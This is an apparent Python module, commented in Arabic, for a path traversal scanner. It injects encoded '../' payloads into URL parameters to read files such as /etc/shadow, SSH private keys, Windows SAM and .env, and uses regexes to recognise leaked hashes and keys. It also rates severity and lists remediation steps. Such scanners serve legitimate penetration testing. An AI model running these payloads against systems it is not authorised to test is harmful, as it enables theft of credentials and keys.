"""
Path/Directory Traversal Scanner
يكتشف ثغرات Path Traversal والوصول غير المصرح للملفات
"""

import re
import urllib.parse
from typing import List, Dict, Any, Set
from core.base_scanner import BaseScanner
from core.http_handler import HTTPHandler
from utils.logger import logger


class PathTraversalScanner(BaseScanner):
    """ماسح ثغرات Path Traversal المتقدم"""
    
    def __init__(self, target: str):
        super().__init__(target)
        self.name = "Path/Directory Traversal Scanner"
        self.description = "Advanced path traversal vulnerability detection"
        self.severity = "high"
        
        # الملفات الحساسة للاختبار
        self.sensitive_files = self._load_sensitive_files()
        
        # تقنيات Traversal
        self.traversal_techniques = self._load_traversal_techniques()
        
        # علامات النجاح
        self.success_patterns = self._load_success_patterns()
        
    def _load_sensitive_files(self) -> Dict[str, List[str]]:
        """تحميل قائمة الملفات الحساسة حسب نظام التشغيل"""
        return {
            "linux": [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/group",
                "/etc/issue",
                "/etc/hostname",
                "/etc/ssh/sshd_config",
                "/etc/apache2/apache2.conf",
                "/etc/nginx/nginx.conf",
                "/proc/self/environ",
                "/proc/version",
                "/proc/cmdline",
                "/var/log/apache2/access.log",
                "/var/log/apache2/error.log",
                "/var/www/html/index.php",
                "/home/user/.bash_history",
                "/root/.bash_history",
                "/home/user/.ssh/id_rsa",
                "/root/.ssh/id_rsa",
            ],
            "windows": [
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\win.ini",
                "C:\\Windows\\system.ini",
                "C:\\boot.ini",
                "C:\\Windows\\php.ini",
                "C:\\xampp\\apache\\conf\\httpd.conf",
                "C:\\inetpub\\wwwroot\\web.config",
                "C:\\Users\\Administrator\\.ssh\\id_rsa",
                "C:\\Windows\\debug\\NetSetup.log",
            ],
            "generic": [
                "index.php",
                "config.php",
                "database.php",
                "wp-config.php",
                ".env",
                ".git/config",
                ".htaccess",
                "composer.json",
                "package.json",
            ]
        }
    
    def _load_traversal_techniques(self) -> List[Dict[str, Any]]:
        """تحميل تقنيات Path Traversal"""
        techniques = []
        
        # 1. Basic Traversal
        basic = {
            "name": "Basic",
            "patterns": [
                "../",
                "..\\",
                ".../",
                "...\\",
            ]
        }
        techniques.append(basic)
        
        # 2. URL Encoded
        encoded = {
            "name": "URL Encoded",
            "patterns": [
                "%2e%2e/",
                "%2e%2e%2f",
                "..%2f",
                "%2e%2e\\",
                "%2e%2e%5c",
                "..%5c",
            ]
        }
        techniques.append(encoded)
        
        # 3. Double URL Encoded
        double_encoded = {
            "name": "Double Encoded",
            "patterns": [
                "%252e%252e/",
                "%252e%252e%252f",
                "..%252f",
                "%252e%252e\\",
                "%252e%252e%255c",
            ]
        }
        techniques.append(double_encoded)
        
        # 4. Unicode/UTF-8 Encoded
        unicode_encoded = {
            "name": "Unicode",
            "patterns": [
                "..%c0%af",
                "..%c1%9c",
                "%c0%ae%c0%ae/",
                "%c0%ae%c0%ae%c0%af",
            ]
        }
        techniques.append(unicode_encoded)
        
        # 5. 16-bit Unicode
        unicode_16 = {
            "name": "16-bit Unicode",
            "patterns": [
                "..%u2215",
                "..%u2216",
                "%u002e%u002e/",
                "%u002e%u002e%u2215",
            ]
        }
        techniques.append(unicode_16)
        
        # 6. Null Byte
        null_byte = {
            "name": "Null Byte",
            "patterns": [
                "../%00",
                "..\\%00",
                "%2e%2e/%00",
                "%2e%2e%5c%00",
            ]
        }
        techniques.append(null_byte)
        
        # 7. Dot Truncation
        dot_truncation = {
            "name": "Dot Truncation",
            "patterns": [
                "../" + "." * 100,
                "..\\" + "." * 100,
            ]
        }
        techniques.append(dot_truncation)
        
        # 8. Overlong UTF-8
        overlong = {
            "name": "Overlong UTF-8",
            "patterns": [
                "..%e0%80%af",
                "%e0%80%ae%e0%80%ae/",
                "..%c0%2f",
            ]
        }
        techniques.append(overlong)
        
        return techniques
    
    def _load_success_patterns(self) -> Dict[str, List[str]]:
        """تحميل أنماط النجاح للكشف"""
        return {
            "linux_passwd": [
                r"root:.*:0:0:",
                r"daemon:.*:/usr/sbin/nologin",
                r"bin:.*:/bin/false",
                r"nobody:.*:nologin",
                r"www-data:",
            ],
            "linux_shadow": [
                r"root:\$[0-9]\$",
                r"[a-z]+:\$[0-9]\$[a-zA-Z0-9./]+:",
            ],
            "linux_hosts": [
                r"127\.0\.0\.1\s+localhost",
                r"::1\s+localhost",
            ],
            "windows_hosts": [
                r"127\.0\.0\.1\s+localhost",
                r"# Copyright.*Microsoft",
            ],
            "windows_ini": [
                r"\[boot loader\]",
                r"\[operating systems\]",
                r"\[fonts\]",
                r"\[extensions\]",
            ],
            "config_files": [
                r"DB_PASSWORD\s*=",
                r"database\s*=",
                r"DB_HOST\s*=",
                r"API_KEY\s*=",
                r"SECRET_KEY\s*=",
                r"<\?php",
            ],
            "ssh_keys": [
                r"-----BEGIN.*PRIVATE KEY-----",
                r"-----BEGIN RSA PRIVATE KEY-----",
                r"-----BEGIN OPENSSH PRIVATE KEY-----",
            ],
            "env_files": [
                r"[A-Z_]+=[^\n]+",
                r"API_KEY=",
                r"DB_PASSWORD=",
                r"SECRET=",
            ],
        }
    
    def scan(self) -> List[Dict[str, Any]]:
        """تنفيذ فحص Path Traversal"""
        logger.info(f"[PathTraversal] Starting scan on {self.target}")
        vulnerabilities = []
        tested_payloads = set()  # لتجنب التكرار
        
        # استخراج parameters
        params = self._extract_parameters()
        
        if not params:
            logger.warning("[PathTraversal] No parameters found")
            return vulnerabilities
        
        # فحص كل parameter
        for param_name, param_value in params.items():
            logger.info(f"[PathTraversal] Testing parameter: {param_name}")
            
            # اختبار Linux files
            linux_vulns = self._test_os_files(
                param_name, param_value, "linux", tested_payloads
            )
            vulnerabilities.extend(linux_vulns)
            
            # اختبار Windows files
            windows_vulns = self._test_os_files(
                param_name, param_value, "windows", tested_payloads
            )
            vulnerabilities.extend(windows_vulns)
            
            # اختبار Generic files
            generic_vulns = self._test_os_files(
                param_name, param_value, "generic", tested_payloads
            )
            vulnerabilities.extend(generic_vulns)
            
            # إذا وجدنا ثغرة، لا حاجة للاستمرار في هذا parameter
            if linux_vulns or windows_vulns or generic_vulns:
                logger.success(f"[PathTraversal] Vulnerability found in {param_name}")
                break
        
        logger.info(f"[PathTraversal] Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    def _test_os_files(self, param_name: str, param_value: str, 
                       os_type: str, tested: Set[str]) -> List[Dict[str, Any]]:
        """اختبار ملفات نظام تشغيل معين"""
        vulnerabilities = []
        files = self.sensitive_files.get(os_type, [])
        
        for file_path in files:
            # اختبار كل تقنية traversal
            for technique in self.traversal_techniques:
                for pattern in technique["patterns"]:
                    # بناء payload مع أعماق مختلفة
                    for depth in range(1, 8):  # من 1 إلى 7 مستويات
                        payload = pattern * depth + file_path.lstrip('/')
                        
                        # تجنب التكرار
                        if payload in tested:
                            continue
                        tested.add(payload)
                        
                        # اختبار payload
                        test_url = self._inject_payload(param_name, payload)
                        
                        try:
                            response = HTTPHandler.send_request(test_url, method="GET")
                            
                            if response:
                                # تحليل الاستجابة
                                is_vulnerable, confidence, evidence = self._analyze_response(
                                    response, file_path, os_type
                                )
                                
                                if is_vulnerable:
                                    vuln = {
                                        "type": "Path Traversal",
                                        "severity": self._calculate_severity(file_path),
                                        "confidence": confidence,
                                        "url": test_url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "method": "GET",
                                        "file_accessed": file_path,
                                        "os_type": os_type,
                                        "technique": technique["name"],
                                        "depth": depth,
                                        "evidence": evidence,
                                        "description": f"Path traversal accessing {file_path}",
                                        "impact": self._get_impact(file_path),
                                        "remediation": self._get_remediation(),
                                        "cwe": "CWE-22",
                                        "cvss": self._calculate_cvss(file_path)
                                    }
                                    vulnerabilities.append(vuln)
                                    logger.success(
                                        f"[PathTraversal] Found: {file_path} via {technique['name']}"
                                    )
                                    return vulnerabilities  # وجدنا ثغرة
                        
                        except Exception as e:
                            logger.debug(f"[PathTraversal] Error: {str(e)}")
        
        return vulnerabilities
    
    def _analyze_response(self, response: Any, file_path: str, 
                         os_type: str) -> tuple:
        """تحليل الاستجابة للكشف عن Path Traversal"""
        if not response or not hasattr(response, 'text'):
            return False, 0, ""
        
        response_text = response.text
        confidence = 0
        evidence = ""
        
        # تحديد نوع الملف
        file_name = file_path.split('/')[-1].split('\\')[-1]
        
        # البحث عن patterns حسب نوع الملف
        if 'passwd' in file_name:
            patterns = self.success_patterns['linux_passwd']
        elif 'shadow' in file_name:
            patterns = self.success_patterns['linux_shadow']
        elif 'hosts' in file_name:
            if os_type == "linux":
                patterns = self.success_patterns['linux_hosts']
            else:
                patterns = self.success_patterns['windows_hosts']
        elif file_name in ['win.ini', 'system.ini', 'boot.ini']:
            patterns = self.success_patterns['windows_ini']
        elif file_name in ['config.php', 'database.php', 'wp-config.php']:
            patterns = self.success_patterns['config_files']
        elif 'id_rsa' in file_name:
            patterns = self.success_patterns['ssh_keys']
        elif file_name == '.env':
            patterns = self.success_patterns['env_files']
        else:
            patterns = self.success_patterns['config_files']
        
        # البحث عن patterns
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            if matches:
                confidence += 35
                if not evidence:
                    evidence = matches[0][:200] if matches[0] else ""
        
        # التحقق من طول الاستجابة
        if len(response_text) > 100:
            confidence += 10
        
        # التحقق من Content-Type
        if hasattr(response, 'headers'):
            content_type = response.headers.get('Content-Type', '').lower()
            if 'text/plain' in content_type or 'application/octet-stream' in content_type:
                confidence += 15
        
        # التحقق من رموز خاص بالملفات
        if os_type == "linux":
            if re.search(r'^[a-z0-9_-]+:[x\*]:[\d]+:[\d]+:', response_text, re.MULTILINE):
                confidence += 30
        elif os_type == "windows":
            if re.search(r'C:\\|Windows\\|Program Files', response_text, re.IGNORECASE):
                confidence += 20
        
        is_vulnerable = confidence >= 50
        
        if not evidence and is_vulnerable:
            evidence = response_text[:300]
        
        return is_vulnerable, min(confidence, 100), evidence
    
    def _calculate_severity(self, file_path: str) -> str:
        """حساب خطورة الثغرة حسب الملف"""
        critical_files = [
            '/etc/shadow', 'SAM', 'SYSTEM', 'id_rsa', '.ssh'
        ]
        
        high_files = [
            '/etc/passwd', 'config.php', 'database.php', 'wp-config.php', 
            '.env', 'web.config'
        ]
        
        for crit in critical_files:
            if crit in file_path:
                return "critical"
        
        for high in high_files:
            if high in file_path:
                return "high"
        
        return "medium"
    
    def _calculate_cvss(self, file_path: str) -> float:
        """حساب CVSS Score"""
        severity = self._calculate_severity(file_path)
        
        cvss_map = {
            "critical": 9.1,
            "high": 7.5,
            "medium": 5.3,
            "low": 3.1
        }
        
        return cvss_map.get(severity, 5.0)
    
    def _get_impact(self, file_path: str) -> str:
        """الحصول على وصف التأثير"""
        if '/etc/shadow' in file_path or 'SAM' in file_path:
            return "Access to password hashes - complete system compromise possible"
        elif 'id_rsa' in file_path:
            return "Access to SSH private keys - unauthorized server access"
        elif '/etc/passwd' in file_path:
            return "Disclosure of system users and account information"
        elif any(x in file_path for x in ['config.php', 'database.php', '.env']):
            return "Exposure of database credentials and sensitive configuration"
        elif 'hosts' in file_path:
            return "Information disclosure about internal network structure"
        else:
            return "Unauthorized access to sensitive files and information disclosure"
    
    def _get_remediation(self) -> str:
        """الحصول على توصيات الإصلاح"""
        return """
        1. Validate and sanitize all user input
        2. Use whitelist of allowed files/paths
        3. Implement proper access controls
        4. Use realpath() to resolve paths
        5. Reject inputs containing ../ or ..\\ 
        6. Use chroot jails or similar sandboxing
        7. Never directly use user input in file operations
        """
    
    def _inject_payload(self, param_name: str, payload: str) -> str:
        """حقن payload في URL"""
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        
        params[param_name] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True, safe='/:')
        new_url = urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def _extract_parameters(self) -> Dict[str, str]:
        """استخراج parameters من URL"""
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        
        simple_params = {}
        for key, values in params.items():
            if values:
                simple_params[key] = values[0]
        
        return simple_params